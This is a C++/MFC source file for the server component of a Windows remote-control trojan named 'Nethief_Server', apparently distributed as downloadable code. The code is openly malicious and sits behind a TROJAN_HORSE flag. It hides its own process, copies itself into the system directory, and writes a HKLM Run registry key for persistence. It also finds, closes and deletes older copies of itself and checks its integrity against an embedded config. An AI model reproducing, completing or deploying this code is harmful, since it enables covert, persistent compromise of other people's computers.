// Server.cpp : Defines the class behaviors for the application.
// Download by http://www.NewXing.com

#include "stdafx.h"
#include "Server.h"
#include "ServerDlg.h"

#include "Md5.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CServerApp

BEGIN_MESSAGE_MAP(CServerApp, CWinApp)
	//{{AFX_MSG_MAP(CServerApp)
		// NOTE - the ClassWizard will add and remove mapping macros here.
		//    DO NOT EDIT what you see in these blocks of generated code!
	//}}AFX_MSG
	ON_COMMAND(ID_HELP, CWinApp::OnHelp)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CServerApp construction

CServerApp::CServerApp()
{
	// TODO: add construction code here,
	// Place all significant initialization in InitInstance
	m_hMutex=NULL;
}

CServerApp::~CServerApp()
{
	// TODO: add construction code here,
	// Place all significant initialization in InitInstance
	if(m_hMutex!=NULL)
	{		
		CloseHandle(m_hMutex);
	}
	delete pCommunity;
	delete pFileSocket;
}

typedef long (__stdcall *RSP)(DWORD, DWORD);
void RegSvc(DWORD dwProcessId, bool bRegService)
{
   HMODULE hMdl=GetModuleHandle("KERNEL32");
   RSP lpfnRsp=(RSP)GetProcAddress(hMdl,"RegisterServiceProcess");
   lpfnRsp(dwProcessId, (DWORD)bRegService);
}

void CServerApp::RegWriteValue(HKEY hKey,CString sKey,
							   CString sChildKey,CString strChildKeyValue)
{
	HKEY hChildKey = NULL; //子键的句柄
	DWORD dwDisposition;
	RegCreateKeyEx(hKey,sKey,0,NULL,REG_OPTION_NON_VOLATILE,
		KEY_CREATE_SUB_KEY | KEY_QUERY_VALUE | 
		KEY_SET_VALUE|KEY_WRITE,NULL,
		&hChildKey,&dwDisposition ); //无论是否存在子键,先建一个再说
	RegSetValueEx(hChildKey,sChildKey,0,REG_SZ,
		(const BYTE *)strChildKeyValue.GetBuffer(strChildKeyValue.GetLength()),
		(DWORD)strChildKeyValue.GetLength()); //设置键值,没有就建立,有就改写
	RegCloseKey(hChildKey); //关闭子键句柄
}

CString CServerApp::RegReadValue(HKEY hKey,CString sKey,CString sChildKey)
{
	DWORD dwBufferSize=255;
	CString strResult;
	HKEY hChildKey;
	if(ERROR_SUCCESS!=RegOpenKeyEx(hKey,sKey,0,KEY_READ,&hChildKey))
	{
		return ""; //打开子键
	}
	BYTE * szBuff;
	szBuff = new BYTE[ dwBufferSize ];

	if(ERROR_SUCCESS!=RegQueryValueEx(hChildKey,sChildKey,0,0,
		&szBuff[0],&dwBufferSize))
	{
		return ""; //读键值
	}
	strResult = (CString)szBuff;
	delete[] szBuff;
	RegCloseKey(hChildKey);
	return strResult;
}

void CServerApp::RegDeleteValue(HKEY hKey,CString sKey,CString sChildKey)
{
	HKEY hChildKey = NULL;  //子键的句柄
	DWORD dwDisposition;
	RegCreateKeyEx(hKey,sKey,0,NULL,REG_OPTION_NON_VOLATILE,
		KEY_CREATE_SUB_KEY | KEY_QUERY_VALUE | 
		KEY_SET_VALUE|KEY_WRITE,NULL,
		&hChildKey,&dwDisposition ) ;
	::RegDeleteValue(hChildKey,sChildKey);
	RegCloseKey(hChildKey); //关闭句柄
}

/////////////////////////////////////////////////////////////////////////////
// The one and only CServerApp object

CServerApp theApp;

/////////////////////////////////////////////////////////////////////////////
// CServerApp initialization

BOOL CServerApp::InitInstance()
{
	if (!AfxSocketInit())
	{
		return FALSE;
	}
	pCommunity=new CCommunity;
	pFileSocket=new CFileSocket;

#if TROJAN_HORSE
	if(FirstRun())
		return FALSE;
	
	if(!(GetVersion()<0x80000000))//如果不是NT/2000/XP,就隐藏进程
	{
		RegSvc(0,true); //注册进程使程序不可见
	}
#endif
	m_hMutex=CreateMutex(NULL,FALSE,"Nethief_Server");
	if(GetLastError()==ERROR_ALREADY_EXISTS)
	{
		m_hMutex=NULL;
	#if ONLINE_TEST
		return FALSE;
	#endif
	}
	////////////////////////////////////////////////////////
	// Standard initialization
	// If you are not using these features and wish to reduce the size
	//  of your final executable, you should remove from the following
	//  the specific initialization routines you do not need.

#ifdef _AFXDLL
	Enable3dControls();			// Call this when using MFC in a shared DLL
#else
	Enable3dControlsStatic();	// Call this when linking to MFC statically
#endif

	CServerDlg dlg;
	m_pMainWnd = &dlg;
	dlg.DoModal();

	// Since the dialog has been closed, return FALSE so that we exit the
	//  application, rather than start the application's message pump.
	return FALSE;
}

BOOL CServerApp::FirstRun()
{
	CString strSystemDir;
	GetSystemDirectory(strSystemDir.GetBufferSetLength(MAX_PATH),MAX_PATH);
	strSystemDir.ReleaseBuffer();

	CString exeFullPath;      //用于保存当前执行程序路径
	GetModuleFileName(NULL,   //得到路径
		exeFullPath.GetBufferSetLength(MAX_PATH),MAX_PATH);
	exeFullPath.ReleaseBuffer();
	CString strExeDir=exeFullPath.Left(exeFullPath.ReverseFind('\\'));
	//检查MD5校验和是否正确////////////////////////////////////////////////
	//读出文件内容
	CFile File(exeFullPath,CFile::modeRead|CFile::shareDenyNone);

	DWORD dwFileLength=File.GetLength()-sizeof(SERVER_CONFIG);
	BYTE* pbyFile=new BYTE[dwFileLength];

	File.Read(pbyFile,dwFileLength);
	File.Close();
	/////////////////////////////////////////////
	//算出MD5校验和
	BYTE byCheckSum[16];
	ZeroMemory(byCheckSum,sizeof(byCheckSum));

	CMd5 Md5;
	Md5.GetMD5CheckSum(pbyFile,dwFileLength,byCheckSum);
	delete pbyFile;
	/////////////////////////////////////////////
#if TROJAN_HORSE && ONLINE_TEST
	//比较MD5校验和是否正确
	int nRet=memcmp(byCheckSum,pCommunity->m_byCheckSum,sizeof(byCheckSum));
	if(nRet!=0)//不正确就退出程序
		return TRUE;
#endif
	///////////////////////////////////////////////////////////////////////
	if(strSystemDir==strExeDir)//如果是自启动运行,则正常运行
		return FALSE;
	CString strKeyName=pCommunity->m_strKeyName;//本服务端键名
	CString strFilename=pCommunity->m_strFilename;//本服务端程序名
	//////////////////////////////////////////////////////////////////
	//枚举Desktop上的所有的父窗口
	HWND hWnd=GetWindow(GetDesktopWindow(),GW_CHILD);
	CWnd *pTheWnd = CWnd::FromHandle(GetWindow(hWnd,GW_HWNDFIRST));
	while (pTheWnd)
	{
		CString strWindowText;
		pTheWnd->GetWindowText(strWindowText);
		if(strWindowText.Left(14)=="Nethief_Server")
		{
			CString strOldKeyName;//以前服务端的键名
			CString strOldFilename;//以前服务端的程序名

			strOldKeyName=strWindowText.Right(strWindowText.GetLength()-17);
			strOldFilename=RegReadValue(HKEY_LOCAL_MACHINE,
				"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
				strOldKeyName);
			////////////////////////////////////////////////
			CFileStatus rOldStatus;
			CFile::GetStatus(strSystemDir+"\\"+strOldFilename,rOldStatus);
			CFileStatus rNewStatus;
			CFile::GetStatus(exeFullPath,rNewStatus);
			if(rOldStatus.m_size==rNewStatus.m_size)
			{
				CFile OldFile(strSystemDir+"\\"+strOldFilename,
					CFile::modeRead|CFile::shareDenyNone);
				CString strOldBuf;
				OldFile.Read(strOldBuf.GetBufferSetLength(rOldStatus.m_size),
					rOldStatus.m_size);
				OldFile.Close();

				CFile NewFile(exeFullPath,CFile::modeRead|CFile::shareDenyNone);
				CString strNewBuf;
				NewFile.Read(strNewBuf.GetBufferSetLength(rNewStatus.m_size),
					rNewStatus.m_size);
				NewFile.Close();
				//////////////////////////////////////
				BOOL bSame=TRUE;
				for(int i=0;i<rNewStatus.m_size;i++)
				{
					if(strOldBuf[i]!=strNewBuf[i])
					{
						bSame=FALSE;
						break;
					}
				}
				if(bSame)
					return TRUE;
			}
			pTheWnd->PostMessage(WM_CLOSE);
			RegDeleteValue(HKEY_LOCAL_MACHINE,
				"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
				strOldKeyName);
			while(!DeleteFile(strSystemDir+"\\"+strOldFilename))
			{
				Sleep(50);
			}
			break;
		}
		///////////////////////////////////////////
		pTheWnd = pTheWnd->GetWindow(GW_HWNDNEXT);
	}
	////以上为清除老的,以下为加入新的//////////////////
	RegWriteValue(HKEY_LOCAL_MACHINE,
		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		strKeyName,strFilename);
	CopyFile(exeFullPath,strSystemDir+"\\"+strFilename,FALSE);
	////////////////////////////////////////////////////
	ShellExecute(NULL,NULL,strFilename,NULL,strSystemDir,SW_SHOWNORMAL);
	return TRUE;
}
